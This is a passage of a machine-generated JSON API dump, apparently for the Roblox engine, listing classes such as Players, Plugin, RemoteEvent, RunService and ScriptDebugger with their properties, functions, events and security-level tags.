ersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"localPlayer","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"numPlayers","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddLeaderboardKey","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"Chat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"bool","Name":"isTeleport","Default":"false"}],"Name":"CreateLocalPlayer","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userID","Default":null}],"Name":"GetPlayerByID","tags":["LocalUserSecurity","deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerById","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerByUserId","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"GetPlayerFromCharacter","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPlayers","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUseCoreScriptHealthBar","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"reason","Default":null},{"Type":"string","Name":"optionalMessage","Default":null}],"Name":"ReportAbuse","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAbuseReportUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBuildUserPermissionsUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetChatFilterUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ChatStyle","Name":"style","Default":"Classic"}],"Name":"SetChatStyle","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetLoadDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveLeaderboardDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSysStatsUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"urlId","Default":null}],"Name":"SetSysStatsUrlId","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"TeamChat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null},{"Type":"Instance","Name":"player","Default":null}],"Name":"WhisperChat","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"getPlayerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getPlayers","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"playerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"players","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"blockerUserId","Default":null},{"Type":"int","Name":"blockeeUserId","Default":null}],"Name":"BlockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetCharacterAppearanceAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetFriendsAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetNameFromUserIdAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"userName","Default":null}],"Name":"GetUserIdFromNameAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"exblockerUserId","Default":null},{"Type":"int","Name":"exblockeeUserId","Default":null}],"Name":"UnblockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"player","Type":"Instance"},{"Name":"friendRequestEvent","Type":"FriendRequestEvent"}],"Name":"FriendRequestEvent","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"}],"Name":"GameAnnounce","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAdded","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAddedEarly","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"chatType","Type":"PlayerChatType"},{"Name":"player","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"targetPlayer","Type":"Instance"}],"Name":"PlayerChatted","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemoving","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemovingLate","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Plugin","tags":[]},{"ValueType":"bool","type":"Property","Name":"CollisionEnabled","tags":["readonly"],"Class":"Plugin"},{"ValueType":"float","type":"Property","Name":"GridSize","tags":["readonly"],"Class":"Plugin"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusiveMouse","Default":null}],"Name":"Activate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"CreateToolbar","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"JointCreationMode","Arguments":[],"Name":"GetJoinMode","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetStudioUserId","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Negate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"script","Default":null},{"Type":"int","Name":"lineNumber","Default":"0"}],"Name":"OpenScript","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenWikiPage","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveSelectedToRoblox","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Separate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Union","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"assetType","Default":null}],"Name":"PromptForExistingAssetId","tags":["PluginSecurity"],"Class":"Plugin","type":"YieldFunction"},{"Arguments":[],"Name":"Deactivation","tags":["PluginSecurity"],"Class":"Plugin","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PluginManager","tags":[]},{"ReturnType":"Instance","Arguments":[],"Name":"CreatePlugin","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportPlace","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportSelection","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PointsService","tags":["notCreatable"]},{"ReturnType":"int","Arguments":[],"Name":"GetAwardablePoints","tags":["deprecated"],"Class":"PointsService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"amount","Default":null}],"Name":"AwardPoints","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGamePointBalance","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPointBalance","tags":["deprecated"],"Class":"PointsService","type":"YieldFunction"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"pointsAwarded","Type":"int"},{"Name":"userBalanceInGame","Type":"int"},{"Name":"userTotalBalance","Type":"int"}],"Name":"PointsAwarded","tags":[],"Class":"PointsService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Pose","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingDirection","type":"Property","Name":"EasingDirection","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingStyle","type":"Property","Name":"EasingStyle","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"MaskWeight","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"Weight","tags":[],"Class":"Pose"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddSubPose","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetSubPoses","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemoveSubPose","tags":[],"Class":"Pose","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PostEffect","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"PostEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BloomEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Threshold","tags":[],"Class":"BloomEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BlurEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BlurEffect"},{"Superclass":"PostEffect","type":"Class","Name":"ColorCorrectionEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Contrast","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Saturation","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"Color3","type":"Property","Name":"TintColor","tags":[],"Class":"ColorCorrectionEffect"},{"Superclass":"PostEffect","type":"Class","Name":"SunRaysEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"SunRaysEffect"},{"ValueType":"float","type":"Property","Name":"Spread","tags":[],"Class":"SunRaysEffect"},{"Superclass":"Instance","type":"Class","Name":"RayValue","tags":[]},{"ValueType":"Ray","type":"Property","Name":"Value","tags":[],"Class":"RayValue"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"Changed","tags":[],"Class":"RayValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"changed","tags":["deprecated"],"Class":"RayValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadata","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataCallbacks","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataClasses","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEnums","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEvents","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataItem","tags":[]},{"ValueType":"bool","type":"Property","Name":"Browsable","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"Deprecated","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"IsBackend","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMaximum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMinimum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"string","type":"Property","Name":"summary","tags":[],"Class":"ReflectionMetadataItem"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataClass","tags":[]},{"ValueType":"int","type":"Property","Name":"ExplorerImageIndex","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"int","type":"Property","Name":"ExplorerOrder","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"bool","type":"Property","Name":"Insertable","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"string","type":"Property","Name":"PreferredParent","tags":[],"Class":"ReflectionMetadataClass"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnum","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnumItem","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataMember","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataProperties","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataYieldFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"RemoteEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireAllClients","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireClient","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireServer","tags":[],"Class":"RemoteEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RemoteFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeClient","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeServer","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"ReturnType":"Tuple","Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"RenderHooksService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"CaptureMetrics","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"DisableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"EnableAdorns","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"EnableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetDeltaAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetGPUDelay","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetPresentTime","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMax","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMin","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderStd","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PrintScene","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReloadShaders","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"width","Default":null},{"Type":"int","Name":"height","Default":null}],"Name":"ResizeWindow","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"RenderSettings","tags":["notbrowsable"]},{"ValueType":"AASamples","type":"Property","Name":"AASamples","tags":[],"Class":"RenderSettings"},{"ValueType":"Antialiasing","type":"Property","Name":"Antialiasing","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"AutoFRMLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"DebugDisableInterpolation","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EagerBulkExecution","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"EditQualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EnableFRM","tags":["hidden"],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ExportMergeByMaterial","tags":[],"Class":"RenderSettings"},{"ValueType":"FramerateManagerMode","type":"Property","Name":"FrameRateManager","tags":[],"Class":"RenderSettings"},{"ValueType":"GraphicsMode","type":"Property","Name":"GraphicsMode","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsAggregationShown","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsSynchronizedWithPhysics","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"MeshCacheSize","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"QualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ReloadAssets","tags":[],"Class":"RenderSettings"},{"ValueType":"Resolution","type":"Property","Name":"Resolution","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowBoundingBoxes","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowInterpolationpath","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"TextureCacheSize","tags":[],"Class":"RenderSettings"},{"ReturnType":"int","Arguments":[],"Name":"GetMaxQualityLevel","tags":[],"Class":"RenderSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedFirst","tags":["notCreatable"]},{"ReturnType":"bool","Arguments":[],"Name":"IsDefaultLoadingGuiRemoved","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveDefaultLoadingScreen","tags":[],"Class":"ReplicatedFirst","type":"Function"},{"Arguments":[],"Name":"FinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Arguments":[],"Name":"RemoveDefaultLoadingGuiSignal","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"RobloxReplicatedStorage","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"RunService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"int","Name":"priority","Default":null},{"Type":"Function","Name":"function","Default":null}],"Name":"BindToRenderStep","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsClient","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunMode","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunning","tags":["RobloxScriptSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsServer","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsStudio","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":["PluginSecurity","deprecated"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"UnbindFromRenderStep","tags":[],"Class":"RunService","type":"Function"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"Heartbeat","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"RenderStepped","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"},{"Name":"step","Type":"double"}],"Name":"Stepped","tags":[],"Class":"RunService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RuntimeScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ScriptContext","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"ScriptsDisabled","tags":["LocalUserSecurity"],"Class":"ScriptContext"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"Instance","Name":"parent","Default":null},{"Type":"string","Name":"name","Default":null}],"Name":"AddCoreScript","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Instance","Name":"parent","Default":null}],"Name":"AddCoreScriptLocal","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"AddStarterScript","tags":["LocalUserSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"bool","Name":"clearHighwaterMark","Default":"true"}],"Name":"GetHeapStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":"false"}],"Name":"SetCollectScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetTimeout","tags":["PluginSecurity"],"Class":"ScriptContext","type":"Function"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"CamelCaseViolation","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"stackTrace","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"Error","tags":[],"Class":"ScriptContext","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptDebugger","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"CurrentLine","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsDebugging","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"Object","type":"Property","Name":"Script","tags":["readonly"],"Class":"ScriptDebugger"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"expression","Default":null}],"Name":"AddWatch","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetBreakpoints","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[],"Name":"GetGlobals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetLocals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStack","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetUpvalues","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"Instance","Name":"watch","Default":null}],"Name":"GetWatchValue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetWatches","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"line","Default":null}],"Name":"SetBreakpoint","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetGlobal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetLocal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetUpvalue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"line","Type":"int"}],"Name":"EncounteredBreak","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[],"Name":"Resuming","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptInformationP